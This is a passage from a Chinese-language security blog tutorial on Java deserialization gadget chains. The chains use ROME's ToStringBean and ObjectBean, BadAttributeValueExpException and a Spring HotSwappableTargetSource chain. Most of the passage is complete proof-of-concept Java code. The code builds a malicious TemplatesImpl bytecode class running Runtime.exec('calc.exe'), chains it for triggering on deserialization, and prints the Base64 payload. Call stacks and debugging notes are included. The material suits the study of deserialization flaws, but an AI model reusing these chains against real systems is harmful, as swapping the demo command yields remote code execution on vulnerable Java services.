        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span>
        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//配置ToStringBean中的_beanClass，指定要toString出的类</span>
        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_cloneableBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_toStringBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token function">unSerial</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 输出序列化的Base64编码字符</span>
        <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Map</span> hashMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>流程就不跟进到了，后程一样</p>
<h2 id="0x03-BadAttributeValueExpException"><a href="#0x03-BadAttributeValueExpException" class="headerlink" title="0x03 BadAttributeValueExpException"></a>0x03 BadAttributeValueExpException</h2><p>CC5 的 BadAttributeValueExpException，他的 readObject 方法能够直接调用 toString 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711793340084-aa7164ae-bd57-46d2-98a1-997d9fd87fd6.png#averageHue=%232c2e33&clientId=ufc9b3df2-ec82-4&from=paste&height=405&id=ua1da263a&originHeight=760&originWidth=1446&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=349200&status=done&style=none&taskId=u27eca9ff-39a7-44a2-a5c6-31d452748c1&title=&width=771.2" referrerpolicy="no-referrer" alt="image.png"><br>调用的是 valObj 的 toString，我们看看前面 valObj 是通过反射 ObjectInputStream.GetField，然后获取到 val 参数的值，那我们也直接反射写入就行<br>只不过这样利用链就稍微有点变化了，我们可以直接调用 ToStringBean 的无参 toString()方法了<br>调用栈如下:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>POC 如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BadAttributeValueExpExceptionPOC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//javassist写恶意字节码</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span>
        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 执行序列化与反序列化，并且返回序列化数据</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token function">unSerial</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 输出序列化的Base64编码字符</span>
        <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1x01-调用流程分析"><a href="#1x01-调用流程分析" class="headerlink" title="1x01 调用流程分析"></a>1x01 调用流程分析</h3><p>稍微分析一下<br>断点还是打在 readObject 方法上，跟进<br>由于刚才我们对 badAttributeValueExpException 反射赋值了 val 为 toStringBean 类，所以这里应该会直接到toStringBean 的 toString()<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794393549-ed175c9c-d74d-4f83-81ba-40365ab28cca.png#averageHue=%232d3138&clientId=ufc9b3df2-ec82-4&from=paste&height=360&id=u21b3e72e&originHeight=675&originWidth=1547&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=416176&status=done&style=none&taskId=u03e61bdb-4256-47bc-a431-3a1cb87396a&title=&width=825.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>一路跟进到有参 toString，invoke 调用<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711794480877-7b9a7095-cb19-4e1d-abc9-69bbf9b1c03c.png#averageHue=%232e333b&clientId=ufc9b3df2-ec82-4&from=paste&height=281&id=u602e84c6&originHeight=526&originWidth=1836&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=388519&status=done&style=none&taskId=ueb02d1eb-2285-4bc0-bdd2-16cc813f360&title=&width=979.2" referrerpolicy="no-referrer" alt="image.png"><br>后续就不跟了，一样的流程</p>
<h2 id="0x04-HotSwappableTargetSource-利用链"><a href="#0x04-HotSwappableTargetSource-利用链" class="headerlink" title="0x04 HotSwappableTargetSource 利用链"></a>0x04 HotSwappableTargetSource 利用链</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711855532030-3851a2d8-43e3-4718-bfda-dfbce75bbe55.png#averageHue=%232c2d32&clientId=u949e3f87-10b5-4&from=paste&height=76&id=u4c11ea7c&originHeight=142&originWidth=682&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=55404&status=done&style=none&taskId=uebaab892-d21e-4c1e-9041-842bd14c655&title=&width=363.73333333333335" referrerpolicy="no-referrer" alt="image.png"><br>这条链子属于 spring 原生 toString 利用链，也就是在目标有 spring 依赖的情况下，可以尝试这条链子</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.3.28<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-beans<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.3.28<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
